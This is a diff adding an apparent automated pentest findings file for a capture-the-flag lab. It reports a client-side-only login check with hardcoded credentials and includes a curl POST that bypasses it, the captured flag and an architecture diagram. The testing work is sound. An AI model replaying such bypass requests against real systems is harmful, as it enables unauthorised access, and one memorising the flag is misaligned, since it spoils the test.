@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T06:12:09.318634+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "e750c732-cb21-4201-872c-08d032c2eb07",
+      "timestamp": "2026-04-13T06:12:09.318550+00:00",
+      "title": "Client-Side Authentication Bypass \u2014 Credentials Exposed in JavaScript",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48341/index.php",
+      "description": "The login form performs authentication validation entirely in client-side JavaScript. The hardcoded credentials (admin/sup3rsecr3t) are visible in the page source. An attacker can bypass the JS check entirely by sending a direct POST request to index.php, which the server-side PHP code accepts without any server-side credential verification. The flag is revealed upon successful authentication.",
+      "evidence": "Credentials found in JS: username='admin', password='sup3rsecr3t'.\n\nPOST /index.php with username=admin&password=sup3rsecr3t&login=login returned HTTP 200 with body containing:\n\nflag{b91c5b74-4cbb-4d5f-ae31-1c673766c83a}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:48341/index.php -d 'username=admin&password=sup3rsecr3t&login=login'",
+        "expected": "Response contains: flag{b91c5b74-4cbb-4d5f-ae31-1c673766c83a}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "d420ed5b-7c28-4d78-9cb5-6d77a950e2a4",
+      "timestamp": "2026-04-13T06:12:22.776660+00:00",
+      "title": "AUTH 02 Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] -->|\"GET /\"| Login[\"Login Page index.php\"]\n  Login -->|\"Client-side JS check (bypassable)\"| JSCheck[\"funcion_login() in JavaScript\"]\n  JSCheck -->|\"POST username+password+login (direct bypass)\"| Server[\"Apache 2.4.25 + PHP 5.6.40\"]\n  Server -->|\"No server-side auth check\"| Flag[\"Flag Disclosure: flag{b91c5b74-4cbb-4d5f-ae31-1c673766c83a}\"]\n  style Flag fill:#ff0000,color:#ffffff"
+    }
+  ]
+}
